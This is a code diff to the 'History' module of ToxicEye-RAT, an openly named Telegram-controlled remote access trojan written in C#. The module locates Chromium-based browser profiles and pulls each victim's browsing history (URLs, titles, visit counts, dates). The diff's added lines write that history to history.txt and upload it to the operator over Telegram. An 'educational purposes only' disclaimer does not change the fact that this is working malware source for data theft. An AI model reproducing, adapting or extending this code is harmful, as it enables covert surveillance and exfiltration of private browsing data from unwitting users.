@@ -1,13 +1,12 @@
 ﻿/* 
        ^ Author    : LimerBoy
        ^ Name      : ToxicEye-RAT
-       ^ Github    : https:github.com/LimerBoy
+       ^ Github    : https://github.com/LimerBoy
 
        > This program is distributed for educational purposes only.
 */
 
 using System;
-using System.Collections.Generic;
 using System.IO;
 
 namespace TelegramRAT
@@ -15,8 +14,7 @@ namespace TelegramRAT
     internal class History
     {
 
-        // Return list with arrays (url, title, visits, time)
-        public static List<Dictionary<string, string>> get()
+        public static void get()
         {
             // Path info
             string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
@@ -51,9 +49,10 @@ namespace TelegramRAT
                 l_a + "Yandex\\YandexBrowser" + u_s
             };
 
-            List<Dictionary<string, string>> historys = new List<Dictionary<string, string>>();
             // Database
             string tempHistoryLocation = "";
+            string filename = "history.txt";
+            string output = "[HISTORY]\n\n";
 
             // Search all browsers
             foreach (string browser in chromiumBasedBrowsers)
@@ -88,20 +87,19 @@ namespace TelegramRAT
                     {
                         break;
                     }
-                    Dictionary<string, string> credentials = new Dictionary<string, string>
-                    {
-                        ["url"] = url,
-                        ["title"] = Crypt.toUTF8(title),
-                        ["visits"] = visits,
-                        ["time"] = time
-                    };
-                    historys.Add(credentials);
+                    // Add
+                    output += "URL: " + url + "\n"
+                           + "TITLE: " + Crypt.toUTF8(title) + "\n"
+                           + "VISITS: " + visits + "\n"
+                           + "DATE: " + time + "\n"
+                           + "\n";
                     continue;
                 }
                 continue;
             }
-
-            return historys;
+            // Send
+            File.WriteAllText(filename, output);
+            telegram.UploadFile(filename, true);
         }
     }
 }
